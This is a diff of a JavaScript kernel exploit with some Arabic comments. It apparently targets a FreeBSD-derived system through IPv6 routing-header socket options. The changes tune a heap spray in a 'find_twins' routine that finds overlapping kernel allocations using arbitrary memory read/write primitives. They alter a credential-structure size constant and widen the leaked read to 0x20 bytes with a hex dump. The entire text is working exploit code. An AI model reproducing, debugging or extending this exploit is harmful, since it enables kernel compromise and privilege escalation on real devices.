@@ -108,7 +108,7 @@ var CPU_SET_SIZE = 0x10;
 var PIPEBUF_SIZE = 0x20;
 var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
-var UCRED_SIZE = 0x40;
+var UCRED_SIZE = 0x80;
 var RTHDR_TAG = 0x13370000;
 var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
@@ -268,12 +268,7 @@ get_sockopt = function(sd, level, optname, optval, optlen) {
   }
   return out_len;
 };
-function set_rthdr(sd, buf, len) {
-  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
-  // return ret;
-}
+
 // 1) احفظ الدالة الأصلية
 var real_set_rthdr = set_rthdr;
 
@@ -287,12 +282,13 @@ set_rthdr = function(sock, buf, len) {
 
   return ret;
 };
-function get_rthdr(sd, buf, max_len) {
-  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
+function set_rthdr(sd, buf, len) {
+  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
   // return ret;
 }
+
 var real_get_rthdr = get_rthdr;
 
 get_rthdr = function(sock, buf, len) {
@@ -301,7 +297,12 @@ get_rthdr = function(sock, buf, len) {
   log("[RTHDR-GET] AFTER ret=" + ret);
   return ret;
 };
-
+function get_rthdr(sd, buf, max_len) {
+  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
+  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
+  // return ret;
+}
 function free_rthdrs(sds) {
   for (var sd of sds) {
     if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
@@ -871,38 +872,26 @@ function find_twins() {
   var spray_add = spray_rthdr.add(0x04);
   var leak_add  = leak_rthdr.add(0x04);
 
-
-  // ============================================================
-  // 1) LOOP الضغط الأساسي
-  //    الضغط = MAX_ROUNDS_TWIN × ipv6_socks.length
-  // ============================================================
   while (count < MAX_ROUNDS_TWIN) {
 
-    log("\n");
-    log("    [TWINS-ROUND] #" + count);
-    log("    ==============================\n");
+    log("\n[TWINS-ROUND] #" + count + "\n");
 
+    // memory pressure check (soft)
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount++;
-
-      if (zeroMemoryCount >= 10) {   // ← ← ← التحكم في تخفيف الضغط
-        log("[TWINS] MEMORY LIMIT REACHED");
-        cleanup();                  // ← ← ← ده اللي بيخفف الضغط
+      if (zeroMemoryCount >= 10) {
+        log("[TWINS] MEMORY LIMIT REACHED (soft abort)");
         return false;
       }
-
     } else {
       zeroMemoryCount = 0;
     }
-    // ============================================================
-    // 3) المرحلة الأولى: الكتابة (أكبر مصدر ضغط)
-    //
-    //    الضغط الحقيقي = set_rthdr × عدد sockets × عدد rounds
-    // ============================================================
+
+    // WRITE PHASE
     for (i = 0; i < ipv6_socks.length; i++) {
 
       if (ipv6_socks[i].eq(BigInt_Error))
@@ -910,41 +899,37 @@ function find_twins() {
 
       var tag = RTHDR_TAG | i;
 
-      log("[WRITE] sock=" + i +
-          " tag=" + hex(tag) +
-          " spray_ptr=" + hex(spray_add));
-
-      // كتابة التاج
       write32(spray_add, tag);
       read32(spray_add);
 
-      // ← ← ← أهم سطر ضغط في الدالة كلها
-      //set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-      // ↑ ↑ ↑ كل استدعاء = allocation جديد
-      // Using pre-filled buffer to spray
-      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr, spray_rthdr_len);
+      setsockopt(
+        ipv6_socks[i],
+        IPPROTO_IPV6,
+        IPV6_RTHDR,
+        spray_rthdr,
+        spray_rthdr_len
+      );
     }
 
-    // ============================================================
-    // 4) المرحلة الثانية: القراءة + القرار
-    //    هنا مفيش ضغط… ده تحليل للنتيجة فقط
-    // ============================================================
+    // READ PHASE
     for (i = 0; i < ipv6_socks.length; i++) {
 
       if (ipv6_socks[i].eq(BigInt_Error))
         continue;
 
-      log("\n[READ] sock=" + i);
-
-      // تصفير قبل القراءة
       write32(leak_add, 0);
 
-      // قراءة من النظام
-      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+      // قراءة 0x20 بايت بدل 8
+      get_rthdr(ipv6_socks[i], leak_rthdr, 0x20);
 
-      // تحليل القيمة
+      // لوج إضافي: dump أول 0x20 بايت
+      var dump = "";
+      for (var k = 0; k < 0x20; k += 4) {
+        dump += hex(read32(leak_rthdr.add(k))) + " ";
+      }
+      log("[DUMP] sock=" + i + " → " + dump);
+
+      // تحليل التاج
       val = read32(leak_add);
       j = val & 0xFFFF;
 
@@ -966,15 +951,11 @@ function find_twins() {
         twins[1] = j;
         return true;
       }
-
-      log("[NO-MATCH] i=" + i + " j=" + j);
     }
 
     count++;
   }
 
-  twins[0] = -1;
-  twins[1] = -1;
   return false;
 }
 function find_triplet(master, other, iterations) {
